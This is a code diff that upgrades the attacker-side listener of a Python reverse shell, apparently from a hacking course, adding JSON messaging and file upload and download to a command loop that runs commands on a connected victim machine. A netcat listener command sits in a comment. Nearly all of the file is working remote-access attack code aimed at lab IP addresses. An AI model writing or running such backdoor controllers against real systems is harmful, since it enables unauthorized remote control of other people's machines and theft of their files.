@@ -1,4 +1,6 @@
 import socket
+import json
+import base64
 
 
 # nc -vv -l -p 4444
@@ -13,18 +15,50 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Got a connection from " + str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+        return self.reliable_receive()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
 
     def start(self):
         while True:
-            command = raw_input(">> ")
-            if command == "exit":
-                break
-            result = self.execute_remotely(command)
-            print(result.decode())
+            command = input(">> ")
+            command = command.split(" ")
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(str(file_content))
+                result = self.execute_remotely(command)
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error during command execution"
+            print(result)
 
 
-my_listener = Listener("192.168.233.135", 4444)
+my_listener = Listener("192.168.189.128", 4444)
 my_listener.start()
